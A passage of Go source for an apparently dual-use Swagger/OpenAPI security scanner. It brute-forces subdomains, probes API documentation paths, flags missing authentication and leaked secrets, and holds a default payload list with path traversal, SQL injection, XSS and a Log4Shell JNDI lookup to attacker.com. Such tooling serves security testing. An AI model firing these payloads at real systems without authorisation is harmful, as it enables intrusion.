package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/csv"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http/cookiejar"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"text/template"
	"time"

	"github.com/projectdiscovery/subfinder/v2/pkg/runner"
	"golang.org/x/net/publicsuffix"
	"golang.org/x/time/rate"

	"github.com/go-resty/resty/v2"
	"github.com/logrusorgru/aurora"
	"github.com/remeh/sizedwaitgroup"
	"github.com/rs/zerolog"
	"gopkg.in/yaml.v3"
)


// ProgressSpinner displays an animated spinner
type ProgressSpinner struct {
	chars    []string
	index    int
	message  string
	stopChan chan bool
	doneChan chan bool
	mu       sync.Mutex
}

// NewProgressSpinner creates a new spinner
func NewProgressSpinner(message string) *ProgressSpinner {
	return &ProgressSpinner{
		chars:    []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"},
		message:  message,
		stopChan: make(chan bool),
		doneChan: make(chan bool),
	}
}

// Start begins the spinner animation
func (s *ProgressSpinner) Start() {
	go func() {
		for {
			select {
			case <-s.stopChan:
				s.doneChan <- true
				return
			default:
				s.mu.Lock()
				fmt.Printf("\r%s %s", s.chars[s.index], s.message)
				s.index = (s.index + 1) % len(s.chars)
				s.mu.Unlock()
				time.Sleep(100 * time.Millisecond)
			}
		}
	}()
}

// Stop stops the spinner with a completion message
func (s *ProgressSpinner) Stop(message string) {
	s.stopChan <- true
	<-s.doneChan
	fmt.Printf("\r✓ %s\n", message)
}

// UpdateMessage updates the spinner message
func (s *ProgressSpinner) UpdateMessage(message string) {
	s.mu.Lock()
	s.message = message
	s.mu.Unlock()
}

// Constants
const (
	Version           = "2.5.0"
	DefaultTimeout    = 30 * time.Second
	DefaultUserAgent  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	MaxRedirects      = 10
	DefaultThreads    = 50
	RateLimit         = 5 // requests per second
	MaxResponseSize   = 10 * 1024 * 1024 // 10MB
)

// Configuration
type Config struct {
	Subfinder struct {
		Sources        []string `yaml:"sources"`
		Recursive      bool     `yaml:"recursive"`
		All            bool     `yaml:"all"`
		Threads        int      `yaml:"threads"`
		Timeout        int      `yaml:"timeout"`
		MaxEnumeration int      `yaml:"max_enumeration"`
	} `yaml:"subfinder"`
	
	Scanner struct {
		Threads        int      `yaml:"threads"`
		Timeout        int      `yaml:"timeout"`
		RateLimit      int      `yaml:"rate_limit"`
		Depth          int      `yaml:"depth"`
		FollowRedirect bool     `yaml:"follow_redirect"`
		Retries        int      `yaml:"retries"`
		UserAgents     []string `yaml:"user_agents"`
		Proxy          string   `yaml:"proxy"`
	} `yaml:"scanner"`
	
	Swagger struct {
		CommonPaths    []string `yaml:"common_paths"`
		Extensions     []string `yaml:"extensions"`
		MaxDepth       int      `yaml:"max_depth"`
		TestEndpoints  bool     `yaml:"test_endpoints"`
		TestPayloads   []string `yaml:"test_payloads"`
	} `yaml:"swagger"`
	
	Output struct {
		Directory string   `yaml:"directory"`
		Formats   []string `yaml:"formats"`
		Verbose   bool     `yaml:"verbose"`
		SaveRaw   bool     `yaml:"save_raw"`
	} `yaml:"output"`
	
	API struct {
		Shodan        string `yaml:"shodan"`
		SecurityTrails string `yaml:"securitytrails"`
		Censys        string `yaml:"censys"`
		BinaryEdge    string `yaml:"binaryedge"`
	} `yaml:"api"`
	
	Wordlists struct {
		Subdomains    string `yaml:"subdomains"`
		SwaggerPaths  string `yaml:"swagger_paths"`
		CommonFiles   string `yaml:"common_files"`
	} `yaml:"wordlists"`
}

// Swagger Specification Structure
type SwaggerSpec struct {
	URL           string                 `json:"url"`
	Version       string                 `json:"version"`
	Title         string                 `json:"title"`
	Description   string                 `json:"description"`
	Host          string                 `json:"host"`
	BasePath      string                 `json:"base_path"`
	Schemes       []string               `json:"schemes"`
	Paths         map[string]interface{} `json:"paths"`
	Definitions   map[string]interface{} `json:"definitions"`
	Parameters    map[string]interface{} `json:"parameters"`
	Responses     map[string]interface{} `json:"responses"`
	Security      []interface{}          `json:"security"`
	Tags          []interface{}          `json:"tags"`
	ExternalDocs  map[string]interface{} `json:"external_docs"`
	RawContent    string                 `json:"raw_content,omitempty"`
}

// Vulnerability Structure
type Vulnerability struct {
	ID          string                 `json:"id"`
	Name        string                 `json:"name"`
	Description string                 `json:"description"`
	Severity    string                 `json:"severity"` // info, low, medium, high, critical
	Confidence  string                 `json:"confidence"` // low, medium, high
	Endpoint    string                 `json:"endpoint"`
	Method      string                 `json:"method"`
	Parameter   string                 `json:"parameter,omitempty"`
	Payload     string                 `json:"payload,omitempty"`
	Evidence    string                 `json:"evidence,omitempty"`
	Impact      string                 `json:"impact,omitempty"`
	Remediation string                 `json:"remediation,omitempty"`
	References  []string               `json:"references,omitempty"`
	CWE         []string               `json:"cwe,omitempty"`
	CVSS        float64                `json:"cvss,omitempty"`
	Timestamp   time.Time              `json:"timestamp"`
	Tags        []string               `json:"tags,omitempty"`
	RawRequest  string                 `json:"raw_request,omitempty"`
	RawResponse string                 `json:"raw_response,omitempty"`
}

// Subdomain Result
type SubdomainResult struct {
	Domain      string     `json:"domain"`
	Subdomain   string     `json:"subdomain"`
	IPAddresses []string   `json:"ip_addresses"`
	Sources     []string   `json:"sources"`
	FirstSeen   *time.Time `json:"first_seen,omitempty"`
	LastSeen    *time.Time `json:"last_seen,omitempty"`
	Status      string     `json:"status"` // active, inactive, unknown
}

// Scan Result
type ScanResult struct {
	Target          string                     `json:"target"`
	Timestamp       time.Time                  `json:"timestamp"`
	Duration        time.Duration              `json:"duration"`
	Subdomains      []SubdomainResult          `json:"subdomains"`
	SwaggerAPIs     map[string]SwaggerSpec     `json:"swagger_apis"`
	Vulnerabilities []Vulnerability            `json:"vulnerabilities"`
	Statistics      Statistics                 `json:"statistics"`
}

// Statistics
type Statistics struct {
	TotalSubdomains   int   `json:"total_subdomains"`
	ActiveSubdomains  int   `json:"active_subdomains"`
	SwaggerFound      int   `json:"swagger_found"`
	Vulnerabilities   int   `json:"vulnerabilities"`
	Critical          int   `json:"critical"`
	High              int   `json:"high"`
	Medium            int   `json:"medium"`
	Low               int   `json:"low"`
	Info              int   `json:"info"`
	RequestsSent      int64 `json:"requests_sent"`
	ResponsesReceived int64 `json:"responses_received"`
	Errors            int64 `json:"errors"`
}

// Scanner main struct
type SwaggerScanner struct {
	config        *Config
	httpClient    *resty.Client
	rateLimiter   *rate.Limiter
	subfinder     *runner.Runner
	logger        zerolog.Logger
	results       *ScanResult
	stats         *Statistics
	vulnDB        map[string]Vulnerability
	mu            sync.RWMutex
	wg            sizedwaitgroup.SizedWaitGroup
	ctx           context.Context
	cancel        context.CancelFunc
}

// displayStageBanner displays a stage banner
func displayStageBanner(stage, description string) {
	au := aurora.NewAurora(true)
	
	stages := map[string]func(interface{}) aurora.Value{
		"subdomain":   au.Blue,
		"swagger":     au.Magenta,
		"analysis":    au.Yellow,
		"testing":     au.Cyan,
		"reporting":   au.Green,
		"complete":    au.BrightGreen,
	}
	
	colorFunc := stages[stage]
	if colorFunc == nil {
		colorFunc = au.White
	}
	
	banner := fmt.Sprintf(`
┌────────────────────────────────────────────────────────────┐
│  STAGE: %-46s │
│  %-52s │
└────────────────────────────────────────────────────────────┘`,
		strings.ToUpper(stage),
		description)
	
	fmt.Println(colorFunc(banner))
	fmt.Println()
}

// displayVulnBanner displays vulnerability findings
func displayVulnBanner(count int, critical, high int) {
	au := aurora.NewAurora(true)
	
	var severity string
	var colorFunc func(interface{}) aurora.Value
	
	switch {
	case critical > 0:
		severity = "CRITICAL"
		colorFunc = au.Red
	case high > 0:
		severity = "HIGH"
		colorFunc = au.Magenta
	case count > 0:
		severity = "MEDIUM/LOW"
		colorFunc = au.Yellow
	default:
		severity = "NONE FOUND"
		colorFunc = au.Green
	}
	
	banner := fmt.Sprintf(`
╔════════════════════════════════════════════════════════════╗
║                    VULNERABILITY REPORT                    ║
╠════════════════════════════════════════════════════════════╣
║  Total Findings: %-43d ║
║  Severity Level: %-43s ║
║  Critical: %-47d ║
║  High: %-51d ║
╚════════════════════════════════════════════════════════════╝`,
		count, severity, critical, high)
	
	fmt.Println(colorFunc(banner))
	fmt.Println()
}

// NewSwaggerScanner creates a new scanner instance
func NewSwaggerScanner(configPath string) (*SwaggerScanner, error) {
	// Load configuration

	au := aurora.NewAurora(true)
		
	config, err := loadConfig(configPath)
	if err != nil {
		return nil, fmt.Errorf("failed to load config: %w", err)
	}

		// Setup logger with custom format
	output := zerolog.ConsoleWriter{Out: os.Stderr}
	output.TimeFormat = "15:04:05"
	output.FormatLevel = func(i interface{}) string {
		var l string
		if ll, ok := i.(string); ok {
			switch ll {
			case "debug":
				l = au.Cyan("•").String()
			case "info":
				l = au.Green("✓").String()
			case "warn":
				l = au.Yellow("⚠").String()
			case "error":
				l = au.Red("✗").String()
			default:
				l = "•"
			}
		}
		return l
	}
	output.FormatMessage = func(i interface{}) string {
		return fmt.Sprintf("%s", i)
	}
	
	logger := zerolog.New(output).With().Timestamp().Logger()

	// Setup logger
	// zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
	// logger := zerolog.New(zerolog.ConsoleWriter{
	//	Out:        os.Stderr,
	//	TimeFormat: "2006-01-02 15:04:05",
	// }).With().Timestamp().Logger()

	// Create HTTP client
	jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
	httpClient := resty.New().
		SetTimeout(time.Duration(config.Scanner.Timeout) * time.Second).
		SetRedirectPolicy(resty.FlexibleRedirectPolicy(MaxRedirects)).
		SetCookieJar(jar).
		SetTLSClientConfig(&tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		}).
		SetHeader("User-Agent", DefaultUserAgent).
		SetRetryCount(config.Scanner.Retries).
		SetRetryWaitTime(2 * time.Second).
		SetRetryMaxWaitTime(10 * time.Second)

	// Set proxy if configured
	if config.Scanner.Proxy != "" {
		httpClient.SetProxy(config.Scanner.Proxy)
	}

	// Create subfinder runner with minimal configuration
	// Create subfinder runner with minimal configuration
opts := &runner.Options{
	Threads:            config.Subfinder.Threads,
	Timeout:            config.Subfinder.Timeout,
	MaxEnumerationTime: config.Subfinder.MaxEnumeration,
}
	
	subfinderRunner, err := runner.NewRunner(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to create subfinder runner: %w", err)
	}

	// Create scanner
	ctx, cancel := context.WithCancel(context.Background())
	
	scanner := &SwaggerScanner{
		config:      config,
		httpClient:  httpClient,
		rateLimiter: rate.NewLimiter(rate.Limit(config.Scanner.RateLimit), 1),
		subfinder:   subfinderRunner,
		logger:      logger,
		results: &ScanResult{
			SwaggerAPIs: make(map[string]SwaggerSpec),
			Timestamp:   time.Now(),
		},
		stats:   &Statistics{},
		vulnDB:  make(map[string]Vulnerability),
		ctx:     ctx,
		cancel:  cancel,
	}
	
	scanner.wg = sizedwaitgroup.New(config.Scanner.Threads)
	
	return scanner, nil
}

// loadConfig loads configuration from file
func loadConfig(configPath string) (*Config, error) {
	if configPath == "" {
		configPath = "config.yaml"
	}

	data, err := os.ReadFile(configPath)
	if err != nil {
		// Return default config if file doesn't exist
		if os.IsNotExist(err) {
			return getDefaultConfig(), nil
		}
		return nil, err
	}

	var config Config
	if err := yaml.Unmarshal(data, &config); err != nil {
		return nil, err
	}

	return &config, nil
}

// getDefaultConfig returns default configuration
func getDefaultConfig() *Config {
	return &Config{
		Subfinder: struct {
			Sources        []string `yaml:"sources"`
			Recursive      bool     `yaml:"recursive"`
			All            bool     `yaml:"all"`
			Threads        int      `yaml:"threads"`
			Timeout        int      `yaml:"timeout"`
			MaxEnumeration int      `yaml:"max_enumeration"`
		}{
			Sources:        []string{},
			Recursive:      false,
			All:            false,
			Threads:        10,
			Timeout:        30,
			MaxEnumeration: 10,
		},
		Scanner: struct {
			Threads        int      `yaml:"threads"`
			Timeout        int      `yaml:"timeout"`
			RateLimit      int      `yaml:"rate_limit"`
			Depth          int      `yaml:"depth"`
			FollowRedirect bool     `yaml:"follow_redirect"`
			Retries        int      `yaml:"retries"`
			UserAgents     []string `yaml:"user_agents"`
			Proxy          string   `yaml:"proxy"`
		}{
			Threads:        50,
			Timeout:        30,
			RateLimit:      5,
			Depth:          3,
			FollowRedirect: true,
			Retries:        3,
			UserAgents: []string{
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
				"Swagger-UI/1.0",
				"PostmanRuntime/7.28.4",
			},
			Proxy: "",
		},
		Swagger: struct {
			CommonPaths   []string `yaml:"common_paths"`
			Extensions    []string `yaml:"extensions"`
			MaxDepth      int      `yaml:"max_depth"`
			TestEndpoints bool     `yaml:"test_endpoints"`
			TestPayloads  []string `yaml:"test_payloads"`
		}{
			CommonPaths: []string{
				"/swagger.json",
				"/swagger.yaml",
				"/swagger.yml",
				"/api/swagger.json",
				"/api/swagger.yaml",
				"/api/swagger.yml",
				"/v1/swagger.json",
				"/v2/swagger.json",
				"/v3/swagger.json",
				"/api/v1/swagger.json",
				"/api/v2/swagger.json",
				"/api/v3/swagger.json",
				"/docs/swagger.json",
				"/docs/swagger.yaml",
				"/docs/swagger.yml",
				"/api-docs/swagger.json",
				"/api-docs/swagger.yaml",
				"/api-docs/swagger.yml",
				"/openapi.json",
				"/openapi.yaml",
				"/openapi.yml",
				"/api/openapi.json",
				"/api/openapi.yaml",
				"/api/openapi.yml",
				"/v1/api-docs",
				"/v2/api-docs",
				"/v3/api-docs",
				"/swagger-ui.html",
				"/swagger/index.html",
				"/api/swagger-ui.html",
				"/swagger/ui/index",
				"/swagger-resources/configuration/ui",
				"/swagger-resources/configuration/security",
			},
			Extensions: []string{".json", ".yaml", ".yml"},
			MaxDepth:   5,
			TestEndpoints: true,
			TestPayloads: []string{
				"../../../../etc/passwd",
				"../../../../windows/win.ini",
				"{{7*7}}",
				"${7*7}",
				"<script>alert(1)</script>",
				"' OR '1'='1",
				"admin'--",
				"1; SELECT SLEEP(5)",
				"${jndi:ldap://attacker.com/a}",
				"||ping -c 10 127.0.0.1||",
			},
		},
		Output: struct {
			Directory string   `yaml:"directory"`
			Formats   []string `yaml:"formats"`
			Verbose   bool     `yaml:"verbose"`
			SaveRaw   bool     `yaml:"save_raw"`
		}{
			Directory: "results",
			Formats:   []string{"json", "html", "md"},
			Verbose:   false,
			SaveRaw:   true,
		},
		Wordlists: struct {
			Subdomains   string `yaml:"subdomains"`
			SwaggerPaths string `yaml:"swagger_paths"`
			CommonFiles  string `yaml:"common_files"`
		}{
			Subdomains:   "wordlists/subdomains.txt",
			SwaggerPaths: "wordlists/swagger_paths.txt",
			CommonFiles:  "wordlists/common_files.txt",
		},
	}
}

// Run starts the scanning process
// Run starts the scanning process
func (s *SwaggerScanner) Run(domain string) error {
	s.logger.Info().Str("domain", domain).Msg("Starting Swagger vulnerability scanner")
	
	// Display initial banner
	displayStageBanner("subdomain", "Enumerating subdomains using multiple techniques")
	
	s.results.Target = domain
	startTime := time.Now()
	
	defer func() {
		s.results.Duration = time.Since(startTime)
		s.saveResults()
		s.printSummary()
	}()
	
	// Step 1: Enumerate subdomains
	displayStageBanner("subdomain", fmt.Sprintf("Scanning %s for subdomains", domain))
	subdomains, err := s.enumerateSubdomains(domain)
	if err != nil {
		return fmt.Errorf("subdomain enumeration failed: %w", err)
	}
	
	s.results.Subdomains = subdomains
	s.stats.TotalSubdomains = len(subdomains)
	
	// Step 2: Find Swagger/OpenAPI endpoints
	displayStageBanner("swagger", "Searching for Swagger/OpenAPI documentation")
	swaggerEndpoints := s.findSwaggerEndpoints(subdomains)
	s.stats.SwaggerFound = len(swaggerEndpoints)
	
	// Step 3: Analyze Swagger specifications for vulnerabilities
	displayStageBanner("analysis", "Analyzing API specifications for security issues")
	s.analyzeSwaggerSpecs(swaggerEndpoints)
	
	// Step 4: Test endpoints for vulnerabilities
	if s.config.Swagger.TestEndpoints {
		displayStageBanner("testing", "Testing API endpoints with security payloads")
		s.testEndpoints(swaggerEndpoints)
	}
	
	// Step 5: Generate reports
	displayStageBanner("reporting", "Generating comprehensive security reports")
	
	return nil
}

// enumerateSubdomains enumerates subdomains for the given domain
func (s *SwaggerScanner) enumerateSubdomains(domain string) ([]SubdomainResult, error) {
	s.logger.Info().Msg("Starting subdomain enumeration")
	
	// Use subfinder
	subfinderResults, err := s.runSubfinder(domain)
	if err != nil {
		s.logger.Error().Err(err).Msg("Subfinder failed")
	}
	
	// Use brute force with wordlist
	bruteResults := s.bruteForceSubdomains(domain)
	
	// Combine and deduplicate results
	allSubdomains := make(map[string]*SubdomainResult)
	
	for _, result := range subfinderResults {
		allSubdomains[result.Subdomain] = result
	}
	
	for _, result := range bruteResults {
		if existing, exists := allSubdomains[result.Subdomain]; exists {
			// Merge sources
			existing.Sources = append(existing.Sources, result.Sources...)
			existing.Sources = uniqueStrings(existing.Sources)
		} else {
			allSubdomains[result.Subdomain] = result
		}
	}
	
	// Check which subdomains are active
	var activeSubdomains []SubdomainResult
	for _, subdomain := range allSubdomains {
		if s.checkSubdomainActive(subdomain.Subdomain) {
			subdomain.Status = "active"
			activeSubdomains = append(activeSubdomains, *subdomain)
		} else {
			subdomain.Status = "inactive"
			activeSubdomains = append(activeSubdomains, *subdomain)
		}
	}
	
	s.stats.ActiveSubdomains = len(activeSubdomains)
	s.logger.Info().Int("total", len(activeSubdomains)).Int("active", s.stats.ActiveSubdomains).Msg("Subdomain enumeration completed")
	
	return activeSubdomains, nil
}

// runSubfinder runs subfinder for domain enumeration
func (s *SwaggerScanner) runSubfinder(domain string) ([]*SubdomainResult, error) {
	var results []*SubdomainResult
	
	buffer := &bytes.Buffer{}
	
	// Use the runner properly - simplified for current Subfinder API
	_, err := s.subfinder.EnumerateSingleDomainWithCtx(s.ctx, domain, []io.Writer{buffer})
	if err != nil {
		return nil, err
	}
	
	scanner := bufio.NewScanner(buffer)
	for scanner.Scan() {
		subdomain := strings.TrimSpace(scanner.Text())
		if subdomain == "" {
			continue
		}
		
		// Resolve IP addresses
		ips, err := net.LookupIP(subdomain)
		ipStrings := []string{}
		if err == nil {
			for _, ip := range ips {
				ipStrings = append(ipStrings, ip.String())
			}
		}
		
		results = append(results, &SubdomainResult{
			Domain:      domain,
			Subdomain:   subdomain,
			IPAddresses: ipStrings,
			Sources:     []string{"subfinder"},
			Status:      "unknown",
		})
	}
	
	return results, nil
}

// bruteForceSubdomains performs brute force subdomain enumeration
func (s *SwaggerScanner) bruteForceSubdomains(domain string) []*SubdomainResult {
	var results []*SubdomainResult
	
	wordlistPath := s.config.Wordlists.Subdomains
	if wordlistPath == "" {
		wordlistPath = "wordlists/subdomains.txt"
	}
	
	// Default wordlist if file doesn't exist
	defaultWordlist := []string{
		"api", "dev", "staging", "test", "uat", "prod", "mobile", "m",
		"admin", "dashboard", "console", "control", "manage",
		"app", "apps", "application", "web", "www", "mail",
		"secure", "auth", "login", "signin", "account",
		"api-gateway", "gateway", "microservice", "service",
		"v1", "v2", "v3", "beta", "alpha", "internal",
		"docs", "documentation", "help", "support",
		"swagger", "openapi", "redoc", "rapidoc",
	}
	
	var wordlist []string
	if data, err := os.ReadFile(wordlistPath); err == nil {
		wordlist = strings.Split(string(data), "\n")
	} else {
		wordlist = defaultWordlist
	}
	
	// Use waitgroup for concurrent brute forcing
	var wg sync.WaitGroup
	resultChan := make(chan *SubdomainResult, len(wordlist))
	semaphore := make(chan struct{}, s.config.Scanner.Threads)
	
	for _, sub := range wordlist {
		if sub == "" {
			continue
		}
		
		wg.Add(1)
		go func(sub string) {
			defer wg.Done()
			
			semaphore <- struct{}{}
			defer func() { <-semaphore }()
			
			fullDomain := sub + "." + domain
			
			// Try to resolve
			ips, err := net.LookupIP(fullDomain)
			if err == nil && len(ips) > 0 {
				ipStrings := make([]string, len(ips))
				for i, ip := range ips {
					ipStrings[i] = ip.String()
				}
				
				resultChan <- &SubdomainResult{
					Domain:      domain,
					Subdomain:   fullDomain,
					IPAddresses: ipStrings,
					Sources:     []string{"bruteforce"},
					Status:      "unknown",
				}
			}
		}(sub)
	}
	
	go func() {
		wg.Wait()
		close(resultChan)
	}()
	
	for result := range resultChan {
		results = append(results, result)
	}
	
	return results
}

// checkSubdomainActive checks if a subdomain is active
func (s *SwaggerScanner) checkSubdomainActive(subdomain string) bool {
	// Try HTTP and HTTPS
	protocols := []string{"https://", "http://"}
	
	for _, protocol := range protocols {
		url := protocol + subdomain
		
		resp, err := s.httpClient.R().
			SetHeader("User-Agent", s.getRandomUserAgent()).
			Head(url)
		
		if err == nil && resp.StatusCode() < 500 {
			return true
		}
	}
	
	return false
}

// findSwaggerEndpoints finds Swagger/OpenAPI endpoints
func (s *SwaggerScanner) findSwaggerEndpoints(subdomains []SubdomainResult) map[string]string {
	s.logger.Info().Msg("Searching for Swagger/OpenAPI endpoints")
	
	endpoints := make(map[string]string)
	var mu sync.Mutex
	
	// Load swagger paths wordlist
	var paths []string
	if s.config.Wordlists.SwaggerPaths != "" {
		if data, err := os.ReadFile(s.config.Wordlists.SwaggerPaths); err == nil {
			paths = strings.Split(string(data), "\n")
		}
	}
	
	if len(paths) == 0 {
		paths = s.config.Swagger.CommonPaths
	}
	
	// Test each subdomain
	for _, subdomain := range subdomains {
		if subdomain.Status != "active" {
			continue
		}
		
		s.wg.Add()
		go func(subdomain string) {
			defer s.wg.Done()
			
			for _, path := range paths {
				select {
				case <-s.ctx.Done():
					return
				default:
					// Apply rate limiting
					s.rateLimiter.Wait(s.ctx)
					
					for _, scheme := range []string{"https", "http"} {
						url := fmt.Sprintf("%s://%s%s", scheme, subdomain, path)
						
						resp, err := s.httpClient.R().
							SetHeader("User-Agent", s.getRandomUserAgent()).
							Get(url)
						
						atomic.AddInt64(&s.stats.RequestsSent, 1)
						
						if err != nil {
							continue
						}
						
						atomic.AddInt64(&s.stats.ResponsesReceived, 1)
						
						if resp.StatusCode() == 200 {
							contentType := resp.Header().Get("Content-Type")
							body := string(resp.Body())
							
							// Check if it's a Swagger/OpenAPI spec
							if s.isSwaggerSpec(body, contentType) {
								mu.Lock()
								endpoints[url] = body
								s.logger.Info().Str("url", url).Msg("Found Swagger/OpenAPI endpoint")
								mu.Unlock()
								
								// Parse and store the spec
								spec := s.parseSwaggerSpec(url, body)
								if spec.Version != "" {
									s.mu.Lock()
									s.results.SwaggerAPIs[url] = spec
									s.mu.Unlock()
								}
							}
						}
					}
				}
			}
		}(subdomain.Subdomain)
	}
	
	s.wg.Wait()
	return endpoints
}

// isSwaggerSpec checks if content is a Swagger/OpenAPI specification
func (s *SwaggerScanner) isSwaggerSpec(content, contentType string) bool {
	content = strings.TrimSpace(content)
	
	if content == "" {
		return false
	}
	
	// Check JSON format
	if strings.Contains(contentType, "application/json") || 
	   strings.HasPrefix(content, "{") && strings.HasSuffix(content, "}") {
		
		// Check for Swagger/OpenAPI fields
		swaggerFields := []string{"swagger", "openapi", "info", "paths", "host", "basePath"}
		contentLower := strings.ToLower(content)
		
		for _, field := range swaggerFields {
			if strings.Contains(contentLower, `"`+field+`"`) {
				return true
			}
		}
		
		// Try to parse as JSON
		var data map[string]interface{}
		if json.Unmarshal([]byte(content), &data) == nil {
			if _, hasSwagger := data["swagger"]; hasSwagger {
				return true
			}
			if _, hasOpenAPI := data["openapi"]; hasOpenAPI {
				return true
			}
			if _, hasPaths := data["paths"]; hasPaths {
				if _, hasInfo := data["info"]; hasInfo {
					return true
				}
			}
		}
	}
	
	// Check YAML format
	if strings.Contains(contentType, "application/yaml") || 
	   strings.Contains(contentType, "text/yaml") ||
	   strings.Contains(content, "swagger:") ||
	   strings.Contains(content, "openapi:") {
		
		// Simple YAML check
		if strings.Contains(content, "swagger:") && strings.Contains(content, "paths:") {
			return true
		}
		if strings.Contains(content, "openapi:") && strings.Contains(content, "paths:") {
			return true
		}
	}
	
	return false
}

// parseSwaggerSpec parses Swagger/OpenAPI specification
func (s *SwaggerScanner) parseSwaggerSpec(url, content string) SwaggerSpec {
	spec := SwaggerSpec{
		URL:        url,
		RawContent: content,
	}
	
	// Try JSON first
	var jsonData map[string]interface{}
	if err := json.Unmarshal([]byte(content), &jsonData); err == nil {
		spec.Version = getString(jsonData, "swagger", "openapi")
		spec.Host = getString(jsonData, "host")
		spec.BasePath = getString(jsonData, "basePath")
		
		if info, ok := jsonData["info"].(map[string]interface{}); ok {
			spec.Title = getString(info, "title")
			spec.Description = getString(info, "description")
		}
		
		if schemes, ok := jsonData["schemes"].([]interface{}); ok {
			for _, scheme := range schemes {
				if str, ok := scheme.(string); ok {
					spec.Schemes = append(spec.Schemes, str)
				}
			}
		}
		
		if paths, ok := jsonData["paths"].(map[string]interface{}); ok {
			spec.Paths = paths
		}
		
		if definitions, ok := jsonData["definitions"].(map[string]interface{}); ok {
			spec.Definitions = definitions
		}
		
		return spec
	}
	
	// TODO: Add YAML parsing support
	return spec
}

// analyzeSwaggerSpecs analyzes Swagger specifications for vulnerabilities
func (s *SwaggerScanner) analyzeSwaggerSpecs(endpoints map[string]string) {
	s.logger.Info().Int("count", len(endpoints)).Msg("Analyzing Swagger specifications")
	
	for url, content := range endpoints {
		spec := s.parseSwaggerSpec(url, content)
		
		// Analyze for vulnerabilities
		vulns := s.analyzeSingleSpec(spec)
		
		s.mu.Lock()
		s.results.Vulnerabilities = append(s.results.Vulnerabilities, vulns...)
		s.mu.Unlock()
	}
}

// analyzeSingleSpec analyzes a single Swagger specification
func (s *SwaggerScanner) analyzeSingleSpec(spec SwaggerSpec) []Vulnerability {
	var vulnerabilities []Vulnerability
	
	// Check 1: Missing authentication
	if len(spec.Security) == 0 {
		vuln := Vulnerability{
			ID:          generateVulnID("NO_AUTH"),
			Name:        "Missing API Authentication",
			Description: "The Swagger specification does not define any security requirements",
			Severity:    "high",
			Confidence:  "medium",
			Endpoint:    spec.URL,
			Method:      "ALL",
			Impact:      "Unauthorized access to API endpoints",
			Remediation: "Implement proper authentication (API keys, OAuth, JWT, etc.)",
			References:  []string{"https://swagger.io/docs/specification/authentication/"},
			CWE:         []string{"CWE-306", "CWE-862"},
			CVSS:        7.5,
			Timestamp:   time.Now(),
			Tags:        []string{"authentication", "swagger"},
		}
		vulnerabilities = append(vulnerabilities, vuln)
	}
	
	// Check 2: Information disclosure in spec
	if spec.RawContent != "" {
		// Check for sensitive information
		sensitivePatterns := map[string]string{
			`(?i)password.*:.*["']([^"']{4,})["']`:  "Password found in Swagger spec",
			`(?i)api[_-]?key.*:.*["']([^"']{8,})["']`: "API key found in Swagger spec",
			`(?i)secret.*:.*["']([^"']{8,})["']`:     "Secret found in Swagger spec",
			`(?i)token.*:.*["']([^"']{8,})["']`:      "Token found in Swagger spec",
			`\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b`: "IP address found in Swagger spec",
			`\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b`: "Email address found",
		}
		
		for pattern, description := range sensitivePatterns {
			re := regexp.MustCompile(pattern)
			matches := re.FindAllString(spec.RawContent, -1)
			
			if len(matches) > 0 {
				vuln := Vulnerability{
					ID:          generateVulnID("INFO_DISCLOSURE"),
					Name:        "Information Disclosure in Swagger Spec",
					Description: description,
					Severity:    "medium",
					Confidence:  "high",
					Endpoint:    spec.URL,
					Method:      "GET",
					Evidence:    strings.Join(matches[:min(3, len(matches))], ", "),
					Impact:      "Sensitive information exposure",
					Remediation: "Remove sensitive information from Swagger specification",
					References:  []string{"https://cwe.mitre.org/data/definitions/200.html"},
					CWE:         []string{"CWE-200"},
					CVSS:        5.3,
					Timestamp:   time.Now(),
					Tags:        []string{"information-disclosure", "swagger"},
				}
				vulnerabilities = append(vulnerabilities, vuln)
				break
			}
		}
	}
	
	// Check 3: Analyze each path for vulnerabilities
	if spec.Paths != nil {
		for path, pathInfo := range spec.Paths {
			if methods, ok := pathInfo.(map[string]interface{}); ok {
				for method, methodInfo := range methods {
					if methodDetails, ok := methodInfo.(map[string]interface{}); ok {
						// Check for missing security on endpoint
						if _, hasSecurity := methodDetails["security"]; !hasSecurity && len(spec.Security) == 0 {
							vuln := Vulnerability{
								ID:          generateVulnID("ENDPOINT_NO_AUTH"),
								Name:        "Endpoint Missing Authentication",
								Description: fmt.Sprintf("Endpoint %s %s does not require authentication", method, path),
								Severity:    "high",
								Confidence:  "medium",
								Endpoint:    spec.URL + path,
								Method:      strings.ToUpper(method),
								Impact:      "Unauthorized access to endpoint",
								Remediation: "Add security requirements to endpoint definition",
								CWE:         []string{"CWE-306"},
								CVSS:        7.5,
								Timestamp:   time.Now(),
								Tags:        []string{"authentication", "endpoint"},
							}
							vulnerabilities = append(vulnerabilities, vuln)
						}
						
						// Check parameters
						if params, ok := methodDetails["parameters"].([]interface{}); ok {
							for _, param := range params {
								if paramMap, ok := param.(map[string]interface{}); ok {
									s.analyzeParameter(paramMap, spec.URL, path, method, &vulnerabilities)
								}
							}
						}
					}
				}
			}
		}
	}
	
	return vulnerabilities
}

// analyzeParameter analyzes a single parameter for vulnerabilities
func (s *SwaggerScanner) analyzeParameter(param map[string]interface{}, baseURL, path, method string, vulns *[]Vulnerability) {
	name := getString(param, "name")
	paramType := getString(param, "type")
	in := getString(param, "in") // query, header, path, body
	
	// Check for NoSQL injection
	if strings.Contains(strings.ToLower(name), "id") || paramType == "string" {
		if in == "query" || in == "body" {
			vuln := Vulnerability{
				ID:          generateVulnID("NOSQL_INJ"),
				Name:        "Potential NoSQL Injection",
